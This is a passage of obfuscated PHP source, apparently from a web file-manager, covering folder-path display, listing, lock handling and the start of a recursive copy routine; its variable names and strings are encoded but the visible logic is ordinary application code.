(!is_array($Åï«ò¼€[$¨­Ü¼ÊÍ[419]])) { continue; } if ($Åï«ò¼€[$¨­Ü¼ÊÍ[417]] != $¨­Ü¼ÊÍ[520]) { continue; } if (isset($Ÿı­Û¡Å[$Åï«ò¼€[$¨­Ü¼ÊÍ[408]]])) { $ßä¨ƒ = $Ÿı­Û¡Å[$Åï«ò¼€[$¨­Ü¼ÊÍ[408]]]; if (!is_array($Åï«ò¼€[$¨­Ü¼ÊÍ[470]])) { $Åï«ò¼€[$¨­Ü¼ÊÍ[470]] = array(); } $Åï«ò¼€[$¨­Ü¼ÊÍ[470]][$¨­Ü¼ÊÍ[521]] = $ßä¨ƒ[$¨­Ü¼ÊÍ[515]]; $Åï«ò¼€[$¨­Ü¼ÊÍ[419]][$¨­Ü¼ÊÍ[522]] = $ßä¨ƒ; $Åï«ò¼€[$¨­Ü¼ÊÍ[419]][$¨­Ü¼ÊÍ[523]] = $Åï«ò¼€[$¨­Ü¼ÊÍ[524]]; $Åï«ò¼€[$¨­Ü¼ÊÍ[419]][$¨­Ü¼ÊÍ[525]] = $¨­Ü¼ÊÍ[99]; if ($ßä¨ƒ[$¨­Ü¼ÊÍ[457]] != $ö£ÂóÔ) { $Åï«ò¼€[$¨­Ü¼ÊÍ[419]][$¨­Ü¼ÊÍ[420]] = $Åï«ò¼€[$¨­Ü¼ÊÍ[419]][$¨­Ü¼ÊÍ[420]] & $ßä¨ƒ[$¨­Ü¼ÊÍ[419]][$¨­Ü¼ÊÍ[419]]; } continue; } $‘¬Âß = $this->parentLevelArray($Åï«ò¼€[$¨­Ü¼ÊÍ[526]]); $ßÜ×â¡– = array_reverse($‘¬Âß); foreach ($ßÜ×â¡– as $ªõƒÉ«ê => $óÁíéùï) { if (!isset($Ÿı­Û¡Å[$óÁíéùï])) { continue; } $ßä¨ƒ = $Ÿı­Û¡Å[$óÁíéùï]; $Åï«ò¼€[$¨­Ü¼ÊÍ[419]][$¨­Ü¼ÊÍ[522]] = $ßä¨ƒ; if ($ßä¨ƒ[$¨­Ü¼ÊÍ[457]] != $ö£ÂóÔ) { $Åï«ò¼€[$¨­Ü¼ÊÍ[419]][$¨­Ü¼ÊÍ[420]] = $Åï«ò¼€[$¨­Ü¼ÊÍ[419]][$¨­Ü¼ÊÍ[420]] & $ßä¨ƒ[$¨­Ü¼ÊÍ[419]][$¨­Ü¼ÊÍ[419]]; } $Ö”ÏÀ‡— = $¨­Ü¼ÊÍ[12]; $ş¸óÇÔá = count($‘¬Âß) - $ªõƒÉ«ê; for ($×¨—Î·ş = 0; $×¨—Î·ş < $ş¸óÇÔá; $×¨—Î·ş++) { if (!isset($¦¯ã–öÓ[$‘¬Âß[$×¨—Î·ş]])) { $Ö”ÏÀ‡— = $¨­Ü¼ÊÍ[12]; break; } $Ö”ÏÀ‡— = $Ö”ÏÀ‡— . rtrim($¦¯ã–öÓ[$‘¬Âß[$×¨—Î·ş]], $¨­Ü¼ÊÍ[8]) . $¨­Ü¼ÊÍ[8]; } $Åï«ò¼€[$¨­Ü¼ÊÍ[419]][$¨­Ü¼ÊÍ[523]] = rtrim($Ö”ÏÀ‡—, $¨­Ü¼ÊÍ[8]) . $¨­Ü¼ÊÍ[8]; break; } } unset($Åï«ò¼€); } public function groupPathDisplay(&$âØ‰Åäí) { $³÷Ö›ü· =& $_SERVER[¯µç›È¢]; if ($âØ‰Åäí[$³÷Ö›ü·[417]] != self::TYPE_GROUP) { return; } $ñ»èÂô = Model($³÷Ö›ü·[527])->getInfo($âØ‰Åäí[$³÷Ö›ü·[510]]); $–Üä‚Èå = $this->parentLevelArray($ñ»èÂô[$³÷Ö›ü·[526]]); $œÊÓ«ñ = $³÷Ö›ü·[12]; foreach ($–Üä‚Èå as $äÂó§© ) { $˜é˜Şô˜ = Model($³÷Ö›ü·[527])->getInfo($äÂó§© ); $œÊÓ«ñ .= $˜é˜Şô˜[$³÷Ö›ü·[97]][$³÷Ö›ü·[408]] . $³÷Ö›ü·[50]; } $âØ‰Åäí[$³÷Ö›ü·[528]] = $ñ»èÂô[$³÷Ö›ü·[503]]; $âØ‰Åäí[$³÷Ö›ü·[529]] = $ñ»èÂô[$³÷Ö›ü·[526]]; $âØ‰Åäí[$³÷Ö›ü·[530]] = $ñ»èÂô[$³÷Ö›ü·[531]]; $âØ‰Åäí[$³÷Ö›ü·[532]] = $œÊÓ«ñ . $ñ»èÂô[$³÷Ö›ü·[97]][$³÷Ö›ü·[408]]; } protected function _listAppendPath(&$Í• “ÂÂ, $«„•ÙÍ = false) { $Ì¡ªµèÊ =& $_SERVER[¯µç›È¢]; static $¤èò™ä¤ = array(); $çŒõÓ“Š = array(); $²ß½˜¯  = array(); if ($«„•ÙÍ) { return $¤èò™ä¤; } foreach ($Í• “ÂÂ as &$µ¼ñ’›») { $×ØıüÕ¼ = $µ¼ñ’›»[$Ì¡ªµèÊ[408]]; if ($µ¼ñ’›»[$Ì¡ªµèÊ[416]] == $Ì¡ªµèÊ[99] && $µ¼ñ’›»[$Ì¡ªµèÊ[503]] != 0) { $¤èò™ä¤[$×ØıüÕ¼] = $µ¼ñ’›»[$Ì¡ªµèÊ[32]]; } if ($µ¼ñ’›»[$Ì¡ªµèÊ[416]] == $Ì¡ªµèÊ[99] && $µ¼ñ’›»[$Ì¡ªµèÊ[503]] == 0 && !isset($¤èò™ä¤[$×ØıüÕ¼])) { $¤èò™ä¤[$×ØıüÕ¼] = $this->_listAppendPathRoot($µ¼ñ’›», array()); } if (isset($²ß½˜¯ [$µ¼ñ’›»[$Ì¡ªµèÊ[526]]])) { continue; } $²ß½˜¯ [$µ¼ñ’›»[$Ì¡ªµèÊ[526]]] = !0; $ñÑšëô = $this->parentLevelArray($µ¼ñ’›»[$Ì¡ªµèÊ[526]]); foreach ($ñÑšëô as $Õñ¤ö”õ => $ ß‡‰Êê) { if (isset($¤èò™ä¤[$ ß‡‰Êê])) { continue; } if ($Õñ¤ö”õ == 0) { $¤èò™ä¤[$ ß‡‰Êê] = $this->_listAppendPathRoot($µ¼ñ’›», $ñÑšëô); } if ($Õñ¤ö”õ != 0) { $çŒõÓ“Š[] = $ ß‡‰Êê; } } } unset($µ¼ñ’›»); $çŒõÓ“Š = array_unique($çŒõÓ“Š); if (count($çŒõÓ“Š) > 0) { $Áõ›¨ö¼ = array($Ì¡ªµèÊ[423] => array($Ì¡ªµèÊ[424], $çŒõÓ“Š)); if (count($çŒõÓ“Š) == 1) { $Å÷ûé“¥ = $this->sourceInfo($çŒõÓ“Š[0]); $€ğ£¦Íç = is_array($Å÷ûé“¥) ? array($Å÷ûé“¥) : !1; } else { $€ğ£¦Íç = $this->field($Ì¡ªµèÊ[533])->where($Áõ›¨ö¼)->select(); } if (!$€ğ£¦Íç) { $€ğ£¦Íç = array(); } foreach ($€ğ£¦Íç as $ú‰üôÈ½) { $¤èò™ä¤[$ú‰üôÈ½[$Ì¡ªµèÊ[408]]] = $ú‰üôÈ½[$Ì¡ªµèÊ[32]]; } } $ıĞâ†äò = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¾é¥˜—™ = array(); foreach ($Í• “ÂÂ as &$µ¼ñ’›») { $õƒéŒ’Ş = $µ¼ñ’›»[$Ì¡ªµèÊ[526]]; $ù¸Öº‹ = $Ì¡ªµèÊ[12]; if (isset($¾é¥˜—™[$õƒéŒ’Ş])) { $ù¸Öº‹ = $¾é¥˜—™[$õƒéŒ’Ş]; } else { $ñÑšëô = $this->parentLevelArray($µ¼ñ’›»[$Ì¡ªµèÊ[526]]); foreach ($ñÑšëô as $Õñ¤ö”õ => $ ß‡‰Êê) { if (isset($¤èò™ä¤[$ ß‡‰Êê])) { $ù¸Öº‹ .= $¤èò™ä¤[$ ß‡‰Êê] . $Ì¡ªµèÊ[8]; } } $¾é¥˜—™[$õƒéŒ’Ş] = $ù¸Öº‹; } $ù¸Öº‹ .= $µ¼ñ’›»[$Ì¡ªµèÊ[32]]; if ($µ¼ñ’›»[$Ì¡ªµèÊ[416]] == $Ì¡ªµèÊ[99]) { $ù¸Öº‹ .= $Ì¡ªµèÊ[8]; } $µ¼ñ’›»[$Ì¡ªµèÊ[524]] = str_replace($Ì¡ªµèÊ[534], $Ì¡ªµèÊ[8], $ù¸Öº‹); if ($µ¼ñ’›»[$Ì¡ªµèÊ[503]] == $Ì¡ªµèÊ[204]) { $µ¼ñ’›»[$Ì¡ªµèÊ[32]] = trim($¤èò™ä¤[$µ¼ñ’›»[$Ì¡ªµèÊ[408]]], $Ì¡ªµèÊ[8]); $µ¼ñ’›»[$Ì¡ªµèÊ[524]] = $µ¼ñ’›»[$Ì¡ªµèÊ[32]] . $Ì¡ªµèÊ[8]; } if (intval($µ¼ñ’›»[$Ì¡ªµèÊ[417]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($µ¼ñ’›», $ñÑšëô, $ıĞâ†äò); } } unset($µ¼ñ’›»); return $Í• “ÂÂ; } private function _listAppendPathRecycle(&$ãº‰ßÆë, $’ ¡´‘, $îŸ’’ä™) { $‰®ö¸„ =& $_SERVER[¯µç›È¢]; if (!in_array($îŸ’’ä™, $’ ¡´‘) && $ãº‰ßÆë[$‰®ö¸„[408]] != $îŸ’’ä™) { return; } $Èë…ºË = explode($‰®ö¸„[8], trim($ãº‰ßÆë[$‰®ö¸„[524]], $‰®ö¸„[8])); $ğı¤Ş€ = implode($‰®ö¸„[8], array_slice($Èë…ºË, 2)); $ãº‰ßÆë[$‰®ö¸„[524]] = $‰®ö¸„[8] . LNG($‰®ö¸„[535]) . $‰®ö¸„[8] . ltrim($ğı¤Ş€, $‰®ö¸„[8]); $ãº‰ßÆë[$‰®ö¸„[526]] = $‰®ö¸„[536] . implode($‰®ö¸„[50], array_slice($’ ¡´‘, 1)) . $‰®ö¸„[50]; if ($ãº‰ßÆë[$‰®ö¸„[408]] == $îŸ’’ä™) { $ãº‰ßÆë[$‰®ö¸„[526]] = $‰®ö¸„[536]; $ãº‰ßÆë[$‰®ö¸„[503]] = $‰®ö¸„[204]; $ãº‰ßÆë[$‰®ö¸„[32]] = LNG($‰®ö¸„[535]); } $ãº‰ßÆë[$‰®ö¸„[537]] = $‰®ö¸„[538]; } protected function _listAppendPathRoot(&$¹„Çö‰, $²à¿òÑÔ) { $Æ»—À¡ş =& $_SERVER[¯µç›È¢]; $ã¯¨ñ¡‰ = $Æ»—À¡ş[12]; if ($¹„Çö‰[$Æ»—À¡ş[417]] == self::TYPE_USER) { if (defined($Æ»—À¡ş[479]) && $¹„Çö‰[$Æ»—À¡ş[510]] == USER_ID) { $ã¯¨ñ¡‰ = LNG($Æ»—À¡ş[539]); if (!$²à¿òÑÔ) { $¹„Çö‰[$Æ»—À¡ş[32]] = $ã¯¨ñ¡‰; } } else { $ùĞ‘Ú¦… = Model($Æ»—À¡ş[518])->getInfoSimple($¹„Çö‰[$Æ»—À¡ş[510]]); $ã¯¨ñ¡‰ = LNG($Æ»—À¡ş[540]) . $Æ»—À¡ş[173] . $ùĞ‘Ú¦…[$Æ»—À¡ş[32]] . $Æ»—À¡ş[541]; $¹„Çö‰[$Æ»—À¡ş[542]] = array($Æ»—À¡ş[32] => $ùĞ‘Ú¦…[$Æ»—À¡ş[32]], $Æ»—À¡ş[543] => $ùĞ‘Ú¦…[$Æ»—À¡ş[543]], $Æ»—À¡ş[544] => $ùĞ‘Ú¦…[$Æ»—À¡ş[544]]); } } else { if ($¹„Çö‰[$Æ»—À¡ş[417]] == self::TYPE_GROUP) { $ùĞ‘Ú¦… = Model($Æ»—À¡ş[527])->getInfoSimple($¹„Çö‰[$Æ»—À¡ş[510]]); $ã¯¨ñ¡‰ = $ùĞ‘Ú¦…[$Æ»—À¡ş[32]]; } else { if ($¹„Çö‰[$Æ»—À¡ş[417]] == self::TYPE_SYSTEM) { $ã¯¨ñ¡‰ = $Æ»—À¡ş[545]; } } } $ã¯¨ñ¡‰ = $ã¯¨ñ¡‰ ? $Æ»—À¡ş[8] . $ã¯¨ñ¡‰ . $Æ»—À¡ş[8] : $Æ»—À¡ş[8]; return $ã¯¨ñ¡‰; } protected function _listAppendUser(&$ç®Ş€) { $àİöµ÷ =& $_SERVER[¯µç›È¢]; $‹—Â’Ï¸ = array_to_keyvalue($ç®Ş€, $àİöµ÷[12], $àİöµ÷[457]); $‰ÅŒğ§‰ = array_to_keyvalue($ç®Ş€, $àİöµ÷[12], $àİöµ÷[459]); $àó ª = array_merge($‹—Â’Ï¸, $‰ÅŒğ§‰); $¿ûÏÈı = Model($àİöµ÷[546])->userListInfo($àó ª); foreach ($ç®Ş€ as &$ã†òôµÚ) { $ÛÊ²Ô–¢ = $ã†òôµÚ[$àİöµ÷[457]]; $ã†òôµÚ[$àİöµ÷[457]] = $¿ûÏÈı[$ÛÊ²Ô–¢] ? $¿ûÏÈı[$ÛÊ²Ô–¢] : !1; $ÛÊ²Ô–¢ = $ã†òôµÚ[$àİöµ÷[459]]; $ã†òôµÚ[$àİöµ÷[459]] = $¿ûÏÈı[$ÛÊ²Ô–¢] ? $¿ûÏÈı[$ÛÊ²Ô–¢] : !1; if (isset($ã†òôµÚ[$àİöµ÷[470]]) && $ã†òôµÚ[$àİöµ÷[470]][$àİöµ÷[547]]) { $’Ôøâßç = $GLOBALS[$àİöµ÷[6]][$àİöµ÷[100]][$àİöµ÷[548]]; if ($ã†òôµÚ[$àİöµ÷[470]][$àİöµ÷[549]] <= time() - $’Ôøâßç) { $this->metaSet($ã†òôµÚ[$àİöµ÷[408]], $àİöµ÷[547], null); $this->metaSet($ã†òôµÚ[$àİöµ÷[408]], $àİöµ÷[549], null); unset($ã†òôµÚ[$àİöµ÷[470]][$àİöµ÷[547]]); continue; } $Ó¶íŒ¸ = $ã†òôµÚ[$àİöµ÷[470]][$àİöµ÷[547]]; $ã†òôµÚ[$àİöµ÷[470]][$àİöµ÷[550]] = Model($àİöµ÷[546])->getInfoSimpleOuter($Ó¶íŒ¸); } } unset($ã†òôµÚ); } public function parentLevelArray($«ª¼Ä¤) { $¯©«Ö =& $_SERVER[¯µç›È¢]; $«ª¼Ä¤ = explode($¯©«Ö[50], trim($«ª¼Ä¤, $¯©«Ö[50])); return array_remove_value($«ª¼Ä¤, $¯©«Ö[204]); } public function listAll($”·ú©õŒ) { $°¿¶‡ =& $_SERVER[¯µç›È¢]; $úğ‚è±Í = $this->sourceInfo($”·ú©õŒ); $ÀÖ˜‰Ó = array($°¿¶‡[551] => array($°¿¶‡[552], $úğ‚è±Í[$°¿¶‡[526]] . $”·ú©õŒ . $°¿¶‡[553]), $°¿¶‡[554] => 0); $éßˆš = $°¿¶‡[555]; $¾ÌàêÛ¤ = "\x4c\x45\x46\124\40\112\x4f\111\x4e\40{$this->tablePrefix}\151\x6f\x5f\146\x69\x6c\x65\40\x66\x69\154\145\40\x6f\156\x20\x73\157\165\162\x63\145\x2e\x66\x69\x6c\145\111\x44\x20\75\x20\x66\151\154\145\x2e\146\151\x6c\145\111\104"; $èÈ–Ôƒ = $this->alias($°¿¶‡[449])->field($éßˆš)->where($ÀÖ˜‰Ó)->join($¾ÌàêÛ¤)->select(); $this->_listAppendAuth($èÈ–Ôƒ); $this->_listAppendUser($èÈ–Ôƒ); $this->_listAppendPath($èÈ–Ôƒ); $èÈ–Ôƒ = array_to_keyvalue($èÈ–Ôƒ, $°¿¶‡[408]); $æ ğ…¯ò = "\x2f{$úğ‚è±Í[$°¿¶‡[32]]}\57"; $æ ğ…¯ò = $æ ğ…¯ò == $°¿¶‡[534] ? $°¿¶‡[8] : $æ ğ…¯ò; $´¸Âüõå = array(); foreach ($èÈ–Ôƒ as $²­Ø”ö => $ç·©ğ÷») { $¾ •şº = $this->parentLevelArray($ç·©ğ÷»[$°¿¶‡[526]]); array_shift($¾ •şº); $¨š«Â† = $æ ğ…¯ò; for ($÷³Æªä = 0; $÷³Æªä < count($¾ •şº); $÷³Æªä++) { $¨š«Â† .= $èÈ–Ôƒ[$¾ •şº[$÷³Æªä]][$°¿¶‡[32]] . $°¿¶‡[8]; } $¨š«Â† .= $ç·©ğ÷»[$°¿¶‡[32]]; if ($ç·©ğ÷»[$°¿¶‡[416]]) { $¨š«Â† .= $°¿¶‡[8]; } $¨š«Â† = str_replace($°¿¶‡[534], $°¿¶‡[8], $¨š«Â†); $¨š«Â† = str_replace($°¿¶‡[534], $°¿¶‡[8], $¨š«Â†); $¥‘ğÆ‘Ü = array($°¿¶‡[427] => str_replace($°¿¶‡[534], $°¿¶‡[8], $¨š«Â†), $°¿¶‡[556] => intval($ç·©ğ÷»[$°¿¶‡[416]]), $°¿¶‡[97] => $this->pathInfoFilter($ç·©ğ÷»)); if (!$ç·©ğ÷»[$°¿¶‡[416]]) { $¥‘ğÆ‘Ü[$°¿¶‡[472]] = $ç·©ğ÷»[$°¿¶‡[472]]; $¥‘ğÆ‘Ü[$°¿¶‡[98]] = $ç·©ğ÷»[$°¿¶‡[88]]; } $´¸Âüõå[] = $¥‘ğÆ‘Ü; } return $´¸Âüõå; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ƒŠ­Õ°î) { $ÂÛÚÒŞÛ =& $_SERVER[¯µç›È¢]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÂÛÚÒŞÛ[557], $ƒŠ­Õ°î); $’ÔûÈâ— = 1; $this->_lockEvent($ƒŠ­Õ°î, array($ÂÛÚÒŞÛ[558], $ÂÛÚÒŞÛ[559]), $’ÔûÈâ—); $this->_lockParent($ƒŠ­Õ°î, array($ÂÛÚÒŞÛ[559]), $’ÔûÈâ—); $this->_lockEvent($ƒŠ­Õ°î, array($ÂÛÚÒŞÛ[560], $ÂÛÚÒŞÛ[561]), $’ÔûÈâ—); $this->_lockCheckEnd($ÂÛÚÒŞÛ[557], $ƒŠ­Õ°î); } public function lockCopyEnd($¶ÏôŒ) { $Ğı¨î¿ =& $_SERVER[¯µç›È¢]; if (!$this->allowLock()) { return; } $æ“†åæà = 0; $this->_lockEvent($¶ÏôŒ, array($Ğı¨î¿[558], $Ğı¨î¿[559]), $æ“†åæà); $this->_lockParent($¶ÏôŒ, array($Ğı¨î¿[559]), $æ“†åæà); $this->_lockEvent($¶ÏôŒ, array($Ğı¨î¿[560], $Ğı¨î¿[561]), $æ“†åæà); } public function lockWriteStart($ÇÌü€á–, $ˆ©Õò¥ = '') { $ßñ¶¹ª =& $_SERVER[¯µç›È¢]; if (!$this->allowLock()) { return; } $this->_lockCheck($ßñ¶¹ª[558], $ÇÌü€á–); $¸‹¶ùƒÄ = 1; $this->_lockKey($ßñ¶¹ª[562] . $ÇÌü€á– . $ßñ¶¹ª[10] . $ˆ©Õò¥, $¸‹¶ùƒÄ); $this->_lockEvent($ÇÌü€á–, array($ßñ¶¹ª[557], $ßñ¶¹ª[559]), $¸‹¶ùƒÄ); $this->_lockParent($ÇÌü€á–, array($ßñ¶¹ª[557], $ßñ¶¹ª[559]), $¸‹¶ùƒÄ); $this->_lockCheckEnd($ßñ¶¹ª[558], $ÇÌü€á–); } public function lockWriteEnd($Â‚õÜîÆ, $ÛÒ›¸¯ = '') { $ØãéÓãú =& $_SERVER[¯µç›È¢]; if (!$this->allowLock()) { return; } $Ÿåœš‘ = 0; $this->_lockKey($ØãéÓãú[562] . $Â‚õÜîÆ . $ØãéÓãú[10] . $ÛÒ›¸¯, $Ÿåœš‘); $this->_lockEvent($Â‚õÜîÆ, array($ØãéÓãú[557], $ØãéÓãú[559]), $Ÿåœš‘); $this->_lockParent($Â‚õÜîÆ, array($ØãéÓãú[557], $ØãéÓãú[559]), $Ÿåœš‘); } public function lockMoveStart($²ı¿×ªÅ) { $å€”áèŒ =& $_SERVER[¯µç›È¢]; if (!$this->allowLock()) { return; } $this->_lockCheck($å€”áèŒ[559], $²ı¿×ªÅ); $ñ ¼Ö»« = 1; $this->_lockKey($å€”áèŒ[563] . $²ı¿×ªÅ, $ñ ¼Ö»«); $this->_lockEvent($²ı¿×ªÅ, array($å€”áèŒ[557], $å€”áèŒ[558]), $ñ ¼Ö»«); $this->_lockParent($²ı¿×ªÅ, array($å€”áèŒ[557], $å€”áèŒ[559]), $ñ ¼Ö»«); $this->_lockEvent($²ı¿×ªÅ, array($å€”áèŒ[564], $å€”áèŒ[560], $å€”áèŒ[561]), $ñ ¼Ö»«); $this->_lockCheckEnd($å€”áèŒ[559], $²ı¿×ªÅ); } public function lockMoveEnd($»ëË‘•©) { $Æ µ¾¤† =& $_SERVER[¯µç›È¢]; if (!$this->allowLock()) { return; } $‹â²¦¼Ø = 0; $this->_lockKey($Æ µ¾¤†[563] . $»ëË‘•©, $‹â²¦¼Ø); $this->_lockEvent($»ëË‘•©, array($Æ µ¾¤†[557], $Æ µ¾¤†[558]), $‹â²¦¼Ø); $this->_lockParent($»ëË‘•©, array($Æ µ¾¤†[557], $Æ µ¾¤†[559]), $‹â²¦¼Ø); $this->_lockEvent($»ëË‘•©, array($Æ µ¾¤†[564], $Æ µ¾¤†[560], $Æ µ¾¤†[561]), $‹â²¦¼Ø); } private function _lockCheck($êèí®ãÉ, $Û…¸‘) { $ñÈÍïÂ¨ =& $_SERVER[¯µç›È¢]; $¥¹Ëòë‡ = $this->sourceInfo($Û…¸‘); $€Æ”¨œ = $êèí®ãÉ . $ñÈÍïÂ¨[10] . $Û…¸‘; $this->_lockTimeStart[$€Æ”¨œ] = timeFloat(); if (!is_array($¥¹Ëòë‡)) { return; } $ÈÖéŞ˜³ = LNG($ñÈÍïÂ¨[565]); CacheLock::setErrorMsg($ñÈÍïÂ¨[173] . htmlspecialchars($¥¹Ëòë‡[$ñÈÍïÂ¨[32]]) . $ñÈÍïÂ¨[541] . $ÈÖéŞ˜³); $this->_lockKey($€Æ”¨œ, 1); $this->_lockKey($€Æ”¨œ, 0); $ÄÅºÕË½ = array_reverse($this->parentLevelArray($¥¹Ëòë‡[$ñÈÍïÂ¨[526]])); foreach ($ÄÅºÕË½ as $â¤üÖùÙ) { $€Æ”¨œ = $êèí®ãÉ . $ñÈÍïÂ¨[566] . $â¤üÖùÙ; if (CacheLock::lockGet($ñÈÍïÂ¨[567] . $€Æ”¨œ)) { $¥¹Ëòë‡ = $this->sourceInfo($â¤üÖùÙ); CacheLock::setErrorMsg($ñÈÍïÂ¨[173] . htmlspecialchars($¥¹Ëòë‡[$ñÈÍïÂ¨[32]]) . $ñÈÍïÂ¨[541] . $ÈÖéŞ˜³); $this->_lockKey($€Æ”¨œ, 1); $this->_lockKey($€Æ”¨œ, 0); } } } private function _lockCheckEnd($®™Ë˜´ò, $¥ö´Å÷“) { $Ç¡–âëÎ =& $_SERVER[¯µç›È¢]; $†õ •†Õ = $®™Ë˜´ò . $Ç¡–âëÎ[10] . $¥ö´Å÷“; CacheLock::setErrorMsg($Ç¡–âëÎ[386]); if (!isset($this->_lockTimeStart[$†õ •†Õ])) { return; } $‰¤õ½÷” = timeFloat() - $this->_lockTimeStart[$†õ •†Õ]; unset($this->_lockTimeStart[$†õ •†Õ]); if ($‰¤õ½÷” > 0.5) { unset(self::$cacheSourceInfo[$Ç¡–âëÎ[463] . $¥ö´Å÷“]); } $¦è©¡î = $this->sourceInfo($¥ö´Å÷“); if (!$¦è©¡î) { show_json(LNG($Ç¡–âëÎ[116]), !1); } } private function _lockParent($Äßñ¡•, $©”à¶†ø, $ÓÏˆø­¥) { if (!$this->autoLockSet) { return; } $ƒÆÍ©ë = $this->sourceInfo($Äßñ¡•); if (!is_array($ƒÆÍ©ë)) { return; } $ËƒÌ¬µô = array_reverse($this->parentLevelArray($ƒÆÍ©ë[$_SERVER[¯µç›È¢][526]])); foreach ($ËƒÌ¬µô as $ö‚‡ßÙ¢) { $this->_lockEvent($ö‚‡ßÙ¢, $©”à¶†ø, $ÓÏˆø­¥); } } private function _lockEvent($«¿¼¿ø, $£óğÜË˜, $ˆ§ë±äĞ) { $·İÇû² =& $_SERVER[¯µç›È¢]; if (!$this->autoLockSet) { return; } foreach ($£óğÜË˜ as $ë˜±˜Ÿ½) { $ÓÀùĞ›Æ = $ë˜±˜Ÿ½ . $·İÇû²[10] . $«¿¼¿ø; if ($ˆ§ë±äĞ && CacheLock::lockGet($·İÇû²[567] . $ÓÀùĞ›Æ)) { continue; } $this->_lockKey($ÓÀùĞ›Æ, $ˆ§ë±äĞ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ªí²ÙÍÁ, $ãëİÊºì = 1) { $€Ô˜Æí¥ = $_SERVER[¯µç›È¢][567] . md5($ªí²ÙÍÁ); if ($ãëİÊºì) { if (isset(self::$_lockItemArr[$€Ô˜Æí¥])) { return; } self::$_lockItemArr[$€Ô˜Æí¥] = 1; CacheLock::lock($€Ô˜Æí¥, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$€Ô˜Æí¥])) { return; } unset(self::$_lockItemArr[$€Ô˜Æí¥]); CacheLock::unlock($€Ô˜Æí¥); } } public function isParentOf($­œ§­£Ï, $ú±ëÒ®ä) { $£éçÃ©ä =& $_SERVER[¯µç›È¢]; $ÊãŸÏÒò = $this->sourceInfo($­œ§­£Ï); $ã×»À’£ = $this->sourceInfo($ú±ëÒ®ä); $±¬ßœ¦ø = $ÊãŸÏÒò[$£éçÃ©ä[526]] . $ÊãŸÏÒò[$£éçÃ©ä[408]] . $£éçÃ©ä[50]; $æÄïèÃ = $ã×»À’£[$£éçÃ©ä[526]] . $ã×»À’£[$£éçÃ©ä[408]] . $£éçÃ©ä[50]; $œ¬¹Û†± = strpos($æÄïèÃ, $±¬ßœ¦ø) === 0; return $œ¬¹Û†±; } private $targetIsDelete = 0; public function copy($Œ„Ë„©Œ, $«Öã•Ê„, $ø’öÂšÌ = REPEAT_REPLACE, $íıØÛï = '') { $ßÆ¯ğ© =& $_SERVER[¯µç›È¢]; $£ ¨Ì»µ = $this->sourceInfo($Œ„Ë„©Œ); $Ş†‘— = $this->sourceInfo($«Öã•Ê„); if (!$£ ¨Ì»µ || !$Ş†‘— || $Ş†‘—[$ßÆ¯ğ©[416]] != $ßÆ¯ğ©[99]) { return !1; } if ($this->isParentOf($Œ„Ë„©Œ, $«Öã•Ê„)) { return !1; } $—Õäóıİ = $íıØÛï ? $íıØÛï : $£ ¨Ì»µ[$ßÆ¯ğ©[32]]; $this->lockCopyStart($Œ„Ë„©Œ); $this->lockWriteStart($«Öã•Ê„, $—Õäóıİ); $’İ¬ÚñÉ = array($ßÆ¯ğ©[568] => array(), $ßÆ¯ğ©[569] => array(), $ßÆ¯ğ©[570] => array()); $this->targetIsDelete = intval($£ ¨Ì»µ[$ßÆ¯ğ©[436]]); $¡¼üÔ€ = $this->fileNameExistCache($«Öã•Ê„, $£ ¨Ì»µ[$ßÆ¯ğ©[32]]); $šê¢ºúŞ = $this->_copy($Œ„Ë„©Œ, $«Öã•Ê„, $ø’öÂšÌ, $’İ¬ÚñÉ, !0, $íıØÛï); $this->_childrenListClear(); $this->lockCopyEnd($Œ„Ë„©Œ); $this->lockWriteEnd($«Öã•Ê„, $—Õäóıİ); if ($£ ¨Ì»µ[$ßÆ¯ğ©[416]] == $ßÆ¯ğ©[99] && $¡¼üÔ€ == $šê¢ºúŞ) { $this->folderSizeResetChildren($¡¼üÔ€); } Model($ßÆ¯ğ©[571])->addAll($’İ¬ÚñÉ[$ßÆ¯ğ©[569]], array(), !0); if ($¡¼üÔ€ != $šê¢ºúŞ || $£ ¨Ì»µ[$ßÆ¯ğ©[416]] == $ßÆ¯ğ©[99]) { Model($ßÆ¯ğ©[572])->eventCopy($šê¢ºúŞ); } $this->saveAll($’İ¬ÚñÉ[$ßÆ¯ğ©[570]]); Model($ßÆ¯ğ©[206])->linkAdd($’İ¬ÚñÉ[$ßÆ¯ğ©[568]]); $this->folderSizeReset($«Öã•Ê„); $this->updateModifyTime($«Öã•Ê„); return $šê¢ºúŞ; } private function _copy($Ó°Ìü‰³, $‹Æ¼áşÈ, $úÏ¬ô«¾, &$ş–‚íŠÓ, $®ª¹íÖ, $˜¥Öù‡ = '') { $‚ôüÏÀ =& $_SERVER[¯µç›È¢]; $³–ñËÖŒ = $this->sourceInfoCache($Ó°Ìü‰³); $â«úï‘Ú = $³–ñËÖŒ[$‚ôüÏÀ[416]] == $‚ôüÏÀ[99]; $Ö¸È™²« = $˜¥Öù‡ ? $˜¥Öù‡ : $³–ñËÖŒ[$‚ôüÏÀ[32]]; $ÃİëÖş = $this->fileNameExistCache($‹Æ¼áşÈ, $Ö¸È™²«); if ($®ª¹íÖ) { $this->_childrenAllMake($Ó°Ìü‰³); if ($â«úï‘Ú && $ÃİëÖş) { $this->_childrenAllMake($ÃİëÖş); } } if (!$ÃİëÖş) { return $this->_copyCreate($Ó°Ìü‰³, $‹Æ¼áşÈ, $Ö¸È™²«, $ş–‚íŠÓ); } $²î½¦¿Ë = $ÃİëÖş; if ($â«úï‘Ú) { if ($úÏ¬ô«¾ == REPEAT_RENAME_FOLDER) { $Ö¸È™²« = $this->fileNameAutoCache($‹Æ¼áşÈ, $Ö¸È™²«, $úÏ¬ô«¾, $â«úï‘Ú); $²î½¦¿Ë = $this->_copyCreate($Ó°Ìü‰³, $‹Æ¼áşÈ, $Ö¸È™²«, $ş–‚íŠÓ); } else { $®ô¢©¡Æ = $this->_childrenList($Ó°Ìü‰³); foreach ($®ô¢©¡Æ as $€æ‹Â÷Í) { $this->_copy($€æ‹Â÷Í[$‚ôüÏÀ[408]], $ÃİëÖş, $úÏ¬ô«¾, $ş–‚íŠÓ, !1); } } } else { if ($úÏ¬ô«¾ == REPEAT_RENAME || $úÏ¬ô«¾ == REPEAT_RENAME_FOLDER) { 